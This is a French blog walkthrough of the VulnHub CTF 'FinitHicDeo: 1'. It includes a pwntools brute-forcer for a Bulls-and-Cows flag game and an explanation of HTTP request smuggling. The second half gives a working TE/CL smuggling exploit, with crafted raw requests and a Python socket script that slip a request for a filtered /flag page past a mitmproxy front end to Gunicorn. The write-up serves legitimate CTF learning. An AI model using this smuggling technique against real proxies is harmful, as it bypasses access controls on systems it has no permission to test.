# Solution du CTF FinitHicDeo de VulnHub

[FinitHicDeo: 1](https://www.vulnhub.com/entry/finithicdeo-1,636/) est un CTF créé par *Muzkkir Husseni* et *Nachiket Rathod* et proposé sur VulnHub.

Ici pas de boot2root , on est plutôt sur deux exercices, l'un de programmation et l'autre sur l'exploitation d'une vulnérabilité web spécifique.

```
Nmap scan report for 192.168.242.131
Host is up (0.00073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Gunicorn 20.0.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/20.0.1
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     ____ ___ ____ _ _ ____ 
|     ___|_____ __ ( _ ) | __ ) _ _| | | / ___| __ _ _ __ ___ ___ 
|     \x20\x20/\x20/ / / _ /\x20| _ \| | | | | | | | _ / _` | '_ ` _ \x20/ _ \x20
|     |__| (_) \x20V V / | (_> < | |_) | |_| | | | | |_| | (_| | | | | | | __/ 
|     _______/ _/_/ ___// |____/ __,_|_|_| ____|__,_|_| |_| |_|___|
|     -->>Welcome to this Amazing Game!!!!
|     ->It is an old code-breaking mind game. Flag is hidden in this format : "flag{carp3_d13m_8462}"
|     ->Reference: https://en.wikipedia.org/wiki/Bulls_and_Cows
|     Users have to guess a flag value. For every character that the user guessed correctly in the correct place, they have a 
|     bulls
|     every character, the user guessed correctly in the wrong place is a 
|     cows
|     every guess, you will see how many 
|     cows
|     bulls
|_    have. Once the user guesses the
```

## Y'a que des taureaux et des **** qui viennent du Texas mon ptit cowboy

Sur ce port 3000 on a l'équivalent du jeu mastermind :

```shellsession
$ nc 192.168.242.131 3000 -v
Connection to 192.168.242.131 3000 port [tcp/hbci] succeeded!

  ____                 ___     ____        _ _    ____                      
 / ___|_____      __  ( _ )   | __ ) _   _| | |  / ___| __ _ _ __ ___   ___ 
| |   / _ \ \ /\ / /  / _ \/\ |  _ \| | | | | | | |  _ / _` | '_ ` _ \ / _ \ 
| |__| (_) \ V  V /  | (_>  < | |_) | |_| | | | | |_| | (_| | | | | | |  __/ 
 \____\___/ \_/\_/    \___/\/ |____/ \__,_|_|_|  \____|\__,_|_| |_| |_|\___|

-->>Welcome to this Amazing Game!!!!
->It is an old code-breaking mind game. Flag is hidden in this format : "flag{carp3_d13m_8462}"
->Reference: https://en.wikipedia.org/wiki/Bulls_and_Cows

Users have to guess a flag value. For every character that the user guessed correctly in the correct place, they have a “bulls”. For every character, the user guessed correctly in the wrong place is a “cows”. For every guess, you will see how many “cows” and “bulls” you have. Once the user guesses the correct number, the game is over. However, to simplify this, you can send the same character in one string.

Example:
$ If flag is: acc3p7_y0ur531f
INPUT: 83_aws0m3_n_gud
OUTPUT: { User: 83_aws0m3_n_gud || Cow:8 && Bull:0 }
INPUT: acc3p7_y0ur531f
OUTPUT: { User: acc3p7_y0ur531f || Cow:0 && Bull:15 }

character in flag: a-z, _, 0-9

commands:
You can see your input logs by :  logs
You can quit the game by       :  exit

Note: Just Play Games at least. ;) 

$ : abcde0123456789

{ User: abcde0123456789 || Cow:5 && Bull:0 }
```

Le flag doit faire 15 caractères et être composé de lettres minuscules, chiffres et underscore. Il semble que l'on puisse faire autant de tentatives que l'on souhaite donc je vais faire une première boucle pour juster tester l'utilisation de chaque caractère dans le flag puis dans une seconde boucle chercher la (ou les) bonne(s) position(s) des occurences du caractère.

Pour cette fois j'ai décidé [pwntools](https://docs.pwntools.com/en/stable/index.html) qui a quelques méthodes sympas pour lire sur une socket jusqu'à la réception d'une chaîne particulière.

```python
import string
import re
from collections import Counter

from pwnlib.tubes.remote import remote

BULL_REGEX = re.compile(r"Bull:(\d+)")

r = remote("192.168.242.131", 3000)
characters = []
bad_char = ""
for char in string.ascii_lowercase + "_" + string.digits:
    r.recvuntilS(b"$ : ")
    r.send((char * 15).encode())
    result = r.recvuntilS(b"}")
    appearances = int(BULL_REGEX.search(result).group(1))
    if appearances:
        characters.extend([char] * appearances)
    else:
        bad_char = char

flag = ["?"] * 15
counter = Counter(characters)
for char in set(characters):
    good_count = 0
    for pos in range(15):
        s = bad_char * pos
        s += char
        s += bad_char * (15 - pos - 1)
        r.recvuntilS(b"$ : ")
        r.send(s.encode())
        result = r.recvuntilS(b"}")
        appearances = int(BULL_REGEX.search(result).group(1))
        if appearances:
            flag[pos] = char
            good_count += 1
            if counter[char] == good_count:
                break
    print("".join(flag))

r.close()
```

Et à l'exécution :

```
?_?????_???_???
?_f????_???_???
?_f????_???_d??
?_f????_h??_d??
?_f????_h??_d?0
?_f1?1?_h1?_d?0
?_f1n1?_h1?_d?0
?_f1n1?_h1?_d30
?_f1n1?_h1c_d30
t_f1n1t_h1c_d30
```

Si on saisit ça :

```
$ : t_f1n1t_h1c_d30

{ User: t_f1n1t_h1c_d30 || Cow:0 && Bull:15 }

Congrats you got flag!!!

FHD{t_f1n1t_h1c_d30}
```

## HTTP Request Smugling

Le principe derrière les vulnérabilités de *HTTP Request Smugling* c'est que l'on se trouve face à un serveur intermédiaire (reverse proxy, load balancer, solution de sécurité type WAF) qui filtre les requêtes afin de ne transmettre que le trafic autorisé vers le serveur final.

Le server intermédiaire (frontend car c'est lui qui réceptionne en premier les requêtes) comprend le protocol HTTP selon ses propres règles et le serveur final (backend) a peut être des règles différentes.

Ces règles sont parfois laissées à l'interprétation des développeurs de serveurs web parce que les RFCs n'explicitent pas forcément comment traiter les cas particulier.

Dans le cas du request smugling un type d'attaque courant consiste à spécifier à la fois l'entête `Content-Type` ,où la taille du corps de la requête est clairement défini, tout en indiquant un transfert de type `chunked` ou chaque block de données se voit préfixé de sa taille.

Le serveur doit alors faire un choix et choisir à quel entête il fait confiance. Si les deux serveurs ont des règles différentes le frontend peut ne pas filtrer une requête car pour lui certaines données seront dans le corps de la requête alors que le backend y verra une requête supplémentaire : celle qui était sensée être filtrée.

Ici, on a l'indication que le backend est un *Gunicorn*. L'identité du frontend n'est pas donné mais si on envoie une requête HTTP malformée on reçoit un message d'erreur *mitmproxy*.

Il semble ainsi que les vieilles versions de mitmproxy soient vulnérables au request smugling. Les détails de fonctionnement entre mitmproxy et Gunicorn se basent sur la vérification de l'entête Content-Encoding comme décrit dans [la solution de ce CTF](https://blog.deteact.com/gunicorn-http-request-smuggling/) qui est très proche de notre situation.

Seulement ici... ça ne marche pas tout à fait pareil.

Mais avant il est important de rappeler à quoi ressemble une requête classique avec Content-Length :

```http
POST /api HTTP/1.1\r\n
Host: truc.com\r\n
Content-Length: 5\r\n
\r\n
12345
```

That's it ! J'ai indiqué les CRLF ("\r\n") pour les détails. Si la connexion est gardée ouverte (keep-alive) pour enchainer les requêtes alors la requête suivante reprendra exactement à la suite (sans CRLF entre les deux).

Maintenant voyons une requête chunked :

```http
POST /api HTTP/1.1\r\n
Host: truc.com\r\n
Transfer-Encoding: chunked\r\n
\r\n
5\r\n
12345\r\n
0\r\n
\r\n
```

Un block de données chunk correspond à sa taille (ici 5) dans sa représentation hexadécimale suivi d'un CRLF, suivi des données elles mêmes suivies d'un CRLF.

Pour terminer on trouve à la fin un chunk vide (de taille 0) suivi de son CRLF et encore d'un CRLF car il n'y a pas de données.

## Exploit time

L'objectif du CTF est d'accéder à la resource /flag qui est filtrée par le *mitmproxy*.

Mes premières tentatives ont consisté à envoyer ceci :

```http
POST /nawak HTTP/1.1\r\n
Host: 192.168.242.131\r\n
Transfer-Encoding: chunkedyolo\r\n
Content-Length: 4\r\n
Connection: keep-alive\r\n
\r\n
2d\r\n
GET /flag HTTP/1.1\r\n
Host: 192.168.242.131\r\n
\r\n
\r\n
0\r\n
\r\n
GET /yolo HTTP/1.1\r\n
Host: 192.168.242.131\r\n
\r\n
```

La valeur `chunkedyolo` est acceptée comme valide par *mitmproxy* qui va considérer la requête pour `/flag` comme étant le body de la requête `POST /nawak` (on a un bloc de `0x2d` soit 45 octets).

De sont côté, *Gunicorn* considère l'entête `Transfer-Encoding` comme étant invalide. Il se base donc sur le `Content-Length` de 4 octets. Pour lui ces données de 4 octets sont `2d\r\n` et la suite est donc une requête valide.

La dernière requête à `/yolo` force `mitmproxy` à voir deux requêtes en entrées. Sans cette entrée il risquerait de ne pas nous renvoyer la réponse de *Gunicorn* pour `/flag` (il s'arrêterait à la réponse pour `/nawak`).

Maintenant la dernière problématique que j'ai eu c'est le block vide qui casse notre requête `/flag`. La seule technique consiste alors à spécifier un `Content-Length` : même si on est sur une requête GET ça passe, le body correspondant au bloc vide sera ignoré.

J'ai écrit le code Python suivant :

```python
import socket                                                                                                          
from urllib.parse import urlparse                                                                                      
                                                                                                                                                                                                          
def te_cl(url: str, encoding: str="chunked"):                                                                          
    parts = urlparse(url)                                                                                              
    real_request = (                                                                                                   
        f"GET {parts.path}{'?' if parts.query else ''}{parts.query} HTTP/1.1\r\n"                                      
        f"Host: {parts.netloc}\r\n"                                                                                    
        "Content-Length: 7\r\n"                                                                                        
        "\r\n"                                                                                                         
    )                                                                                                                  
                                                                                                                       
    hex_size = hex(len(real_request))[2:]                                                                              
    # Chunked is {hex size}\r\n{data}\r\n                                                                              
    # and 0\r\n\r\n at the end                                                                                         
    body = hex_size + "\r\n" + real_request + "\r\n0\r\n\r\n"                                                          
    wrapping_request = (                                                                                               
        f"POST /nawak HTTP/1.1\r\n"                                                                                    
        f"Host: {parts.netloc}\r\n"                                                                                    
        f"Transfer-Encoding: {encoding}\r\n"                                                                           
        f"Content-Length: {len(hex_size) + 2}\r\n"                                                                     
        "Connection: keep-alive\r\n"                                                                                   
        "\r\n"                                                                                                         
    )                                                                                                                  
                                                                                                                       
    dummy_request = (                                                                                                  
        f"GET /yolo HTTP/1.1\r\n"                                                                                      
        f"Host: {parts.netloc}\r\n"                                                                                    
        "\r\n"                                                                                                         
    )                                                                                                                  
    wrapping_request += body + dummy_request                                                                           
    return wrapping_request                                                                                            
                                                                                                                       
                                                                                                                       
req = te_cl("http://192.168.242.131/flag", "chunkedyolo")                                                              
print(req)                                                                                                             
                                                                                                                       
sock = socket.socket()                                                                                                 
sock.connect(("192.168.242.131", 80))                                                                                  
sock.send(req.encode())                                                                                                
print(sock.recv(2048).decode())                                                                                        
print(sock.recv(2048).decode())                                                                                        
print(sock.recv(2048).decode())                                                                                        
print(sock.recv(2048).decode())                                                                                        
sock.close()
```

A l'exécution ça donne ceci :

```http
POST /nawak HTTP/1.1
Host: 192.168.242.131
Transfer-Encoding: chunkedyolo
Content-Length: 4
Connection: keep-alive

40
GET /flag HTTP/1.1
Host: 192.168.242.131
Content-Length: 7


0

GET /yolo HTTP/1.1
Host: 192.168.242.131


HTTP/1.1 404 NOT FOUND
Server: gunicorn/20.0.1
Date: Mon, 21 Nov 2022 22:51:14 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 497


404 Page Not Found !!!<br><br><br>$ Hint:<br>
Hey, there are two challenges for you, one at port 80 and another is at port 3000.<br><br>
# Challenge 1:<br>
The main server is running on port 8080 and we used Gunicorn to redirect the traffic at port 80.<br>
You need to get the flag from the "/flag" page by exploiting the vulnerability.<br><br>
# Challenge 2:<br>
Visit 3000 port via nc and pass the coding challenge. :)<br><br>
$ Troubleshooting:<br>
If you face any error just reboot machine. ;)
HTTP/1.1 200 OK
Server: gunicorn/20.0.1
Date: Mon, 21 Nov 2022 22:51:14 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 31


kudos !!!    FHD{finit_hic_ctf}
```

On voit qu'on a bien reçu la réponse pour le flag à la place de celle pour `/yolo`.

*Publié le 21 novembre 2022*
